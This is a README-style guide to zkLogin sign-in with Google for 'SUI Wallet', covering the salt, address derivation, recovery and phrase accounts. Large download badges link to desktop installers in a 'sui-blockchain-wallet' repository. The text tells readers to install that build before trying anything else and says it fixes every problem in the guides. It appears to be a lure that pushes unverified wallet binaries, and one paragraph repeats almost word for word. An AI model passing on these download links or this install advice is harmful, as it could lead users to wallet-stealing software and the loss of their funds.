![SUI Wallet](assets/banner-article.png)

# Signing in to SUI Wallet with Google

The provider confirms who you are; it never learns the address.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Signing in with Google opens a zkLogin account: the address is derived from your Google identity, the
application and a salt, and transactions are signed through a short-lived proof instead of a stored key.
There is no phrase, so the way back to the account is the Google account plus the salt, not 24 words.

## The sign-in steps

Choose the provider option on the welcome screen, complete the sign-in in the window that opens, and let the app return you to the wallet. Nothing is typed into the wallet itself: no phrase, no password, no account name, and nothing to remember afterwards.

Nothing is typed into the wallet itself: no phrase, no password, no account name. The identity comes from
the provider and the rest is derived, which is why the first session is short.

Two things are worth noticing during the flow. The window that opens is the provider's, so the address bar belongs to the provider rather than to the wallet; and the wallet never asks you to type anything into itself. A flow that requests a phrase during a provider sign-in is not this flow.

## The salt and where it is kept

The salt is the third input to the address, alongside the Google identity and the application identifier,
and it is what makes two users with the same provider distinct from each other. Derive the address without
it and you get a different one.

Where the salt lives is not described in these guides, because the product does not document it as a user-
visible object. What matters is the consequence: if the salt cannot be recovered along with the identity,
the address cannot be re-derived, so the app's recovery flow is the place to start rather than a search for
a file.

## The address the flow produces

The address belongs to that combination of identity, application and salt. It is a normal Sui address - it can receive, send and stake like any other - and it is the one you share with a sender, because nothing about it is special-cased.

It is not, however, the same address a phrase account would produce for you. The two account types are
parallel rather than convertible, which matters when someone asks which address to send to.
[What is zkLogin in SUI Wallet?](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/what-is-zklogin-in-sui-wallet.md) takes the derivation apart in more detail.

## What the account can and cannot do

It can hold a balance, send and receive, and take part in the app's features like any other account. The signature is real and the network treats the account the same way, which is exactly why the missing backup matters so much.

What it cannot do is hand you a phrase or a key to keep. That absence is the trade: no paper backup, and no
export. Anyone offering to export a zkLogin key is describing something the design does not have.

The absence of a key also removes a whole category of advice. There is nothing to export, nothing to print, and no paper copy to lose - which sounds like a relief until the provider account is the thing that goes missing, and then there is no second copy anywhere.

## Recovery when the provider account is gone

Without the Google account, the identity input is gone, and the account cannot be reached by signing in -
even though it still exists on the chain. There is no phrase to fall back on, which is why the provider
account's security is part of your wallet security.

A second factor on the Google account is therefore not a housekeeping task; it is the lock on the wallet.
[Recovering a zkLogin SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/recovering-a-zklogin-sui-wallet.md) covers what the app's recovery flow does and does not solve.

If a sign-in flow behaves unlike this page, install the current release from the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) before assuming the account is lost.

## When to use a phrase account instead

Use a phrase account for anything you would hate to lose, for balances that matter, and wherever you want a
backup that does not depend on a third party. The phrase is a piece of paper you control; the provider
account is a service somebody else operates.

A reasonable pattern is both: a provider account for trying things and small balances, and a phrase account
for the part you would miss. [Creating a new SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/creating-a-new-sui-wallet.md) covers the phrase side, including the
step where the 24 words appear.

## FAQ

### Can I sign in with Apple or Facebook instead of Google?

Yes, where the app offers them. The mechanism is the same zkLogin flow; only the identity provider changes,
and a different provider derives a different address.

### Is signing in with Google as safe as a seed phrase?

It is a different trade rather than a ranking. There is no phrase to steal, and there is also no backup you
hold: the account depends on the Google account and the salt.

### Do I need a Google account to use the wallet?

No. The provider path is one option on the welcome screen; a phrase account needs no third party at all.

### What happens if I lose access to the Google account?

The identity input is gone and there is no phrase, so the account cannot be reached by signing in. Start
with the app's recovery flow rather than assuming the funds moved.

### Can I move funds from a Google account to a phrase account?

Yes - send the balance to the phrase account's address. That is the way to end up with an account you can
back up on paper.

### Why is my address different from my friend's with the same provider?

Because the address includes the salt and the provider's identity for you specifically. Two people using
the same provider still have distinct identities.
